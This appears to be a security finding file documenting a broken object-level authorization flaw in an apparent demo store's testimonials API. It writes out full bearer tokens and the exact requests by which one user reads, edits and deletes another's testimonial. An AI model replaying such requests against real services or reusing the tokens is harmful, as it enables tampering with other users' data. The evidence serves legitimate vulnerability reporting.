@@ -1,0 +1,67 @@
+=== IDOR/BOLA Reproduction Evidence ===
+Target: https://duck-store.escape.tech/api/v1/testimonials/{id}
+Vulnerability: Cross-User Testimonial Read, Modify, and Delete
+
+=== Test Setup ===
+User A (victim): testuserA_new (user_id: 013e13dd-8207-4998-870c-c391f9285f24)
+  Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZDgwODMwNzctZDA4OC00YmZlLWIxNDctMGFkNTYxZGU1OWMyIiwidXNlcm5hbWUiOiJ0ZXN0dXNlckEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3Nzg4NH0.2cVSx8CYDsHR-IH25cy9YvxOKW647WXdWoCTTe_2Tko
+
+User B (attacker): testuserB (user_id: 525a9d6a-3532-4df6-b164-340aa300be97)
+  Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNTI1YTlkNmEtMzUzMi00ZGY2LWIxNjQtMzQwYWEzMDBiZTk3IiwidXNlcm5hbWUiOiJ0ZXN0dXNlckIiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3Nzg5N30.FriQK9oV_7NdloNZdxH2TJLfEskcV8mkrKKO95gj7iw
+
+Target Testimonial: ID 6 (owned by User A)
+
+=== STEP 1: User B READS User A's testimonial (ID 6) ===
+Request:
+GET /api/v1/testimonials/6
+Authorization: Bearer <user_b_token>
+
+Response: HTTP/2 200 OK
+{
+  "id": 6,
+  "user_id": "013e13dd-8207-4998-870c-c391f9285f24",
+  "user": {"id": "013e13dd-8207-4998-870c-c391f9285f24", "username": "testuserA_new"},
+  "content": "Test testimonial from user_a_new",
+  "rating": 5,
+  ...
+}
+
+=== STEP 2: User B MODIFIES User A's testimonial (ID 6) ===
+Request:
+PUT /api/v1/testimonials/6
+Authorization: Bearer <user_b_token>
+Content-Type: application/json
+{"content": "MODIFIED BY USER B - IDOR CONFIRMED", "rating": 1}
+
+Response: HTTP/2 200 OK
+{
+  "id": 6,
+  "user_id": "013e13dd-8207-4998-870c-c391f9285f24",
+  "user": {"id": "013e13dd-8207-4998-870c-c391f9285f24", "username": "testuserA_new"},
+  "content": "MODIFIED BY USER B - IDOR CONFIRMED",
+  "rating": 1,
+  ...
+}
+
+=== STEP 3: User B DELETES User A's testimonial (ID 6) ===
+Request:
+DELETE /api/v1/testimonials/6
+Authorization: Bearer <user_b_token>
+
+Response: HTTP/2 204 No Content
+
+=== STEP 4: Confirm Deletion ===
+Request:
+GET /api/v1/testimonials/6
+Authorization: Bearer <user_b_token>
+
+Response: HTTP/2 404 Not Found
+{"detail": "Testimonial not found"}
+
+=== CONCLUSION ===
+User B (different authenticated user) successfully:
+1. READ user A's testimonial (ID 6) - 200 OK
+2. MODIFIED user A's testimonial (ID 6) - 200 OK
+3. DELETED user A's testimonial (ID 6) - 204 No Content
+
+All operations succeeded without authorization checks - confirming BOLA/IDOR vulnerability.
